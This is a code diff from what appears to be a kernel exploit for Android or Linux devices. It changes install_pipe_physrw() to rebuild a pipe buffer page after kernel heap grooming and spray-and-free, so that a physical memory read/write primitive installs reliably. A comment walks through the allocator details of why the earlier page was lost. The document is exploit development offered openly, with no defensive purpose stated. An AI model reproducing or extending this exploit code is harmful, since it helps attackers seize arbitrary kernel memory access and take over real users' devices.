@@ -675,6 +675,29 @@ int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
 }
 
 int install_pipe_physrw(int fd) {
+#if defined(PHYSRW_REFRESH_PIPE_PAGE) && PHYSRW_REFRESH_PIPE_PAGE
+  /* Prepare the pipe page here rather than trusting the one main.c seeded.
+   *
+   * The non-app build never carries a seeded page into this function: its first
+   * call arrives with pipebuf_page_base == 0 and the route thread below
+   * prepares one on the spot, after the FOPS page has been groomed. The app
+   * build has no such thread, so main.c seeds the page *before*
+   * prepare_good_kernel_page(), and that groom's spray-and-free can hand the
+   * page back to the buddy allocator in between. The scan then walks a free
+   * page and matches nothing -- on PMG110 it reads page_type 0xffffff7f, which
+   * is 0xffffffff with PG_buddy cleared, with page->lru holding vmemmap
+   * pointers where a live slab page would hold its slab_cache. PIPE_MAX_ATTEMPTS
+   * is 1 in the app build, so there is no retry to recover on.
+   *
+   * reset_pipe_attempt() first because prepare_pipe_buffer_page() rebuilds the
+   * drain and reclaim fd arrays and kills the previous keeper child. */
+  reset_pipe_attempt();
+  pipebuf_page_base = prepare_pipe_buffer_page();
+  pr_info("physrw pipe page refreshed=%016zx\n", pipebuf_page_base);
+  if (!is_direct_ptr(pipebuf_page_base)) {
+    return 0;
+  }
+#else
   if (pipebuf_page_base == 0) {
     atomic_store(&pipe_prepare_done, 0);
     atomic_store(&pipe_prepare_request, 1);
@@ -682,6 +705,7 @@ int install_pipe_physrw(int fd) {
       usleep(10000);
     }
   }
+#endif
 
   uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
   uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
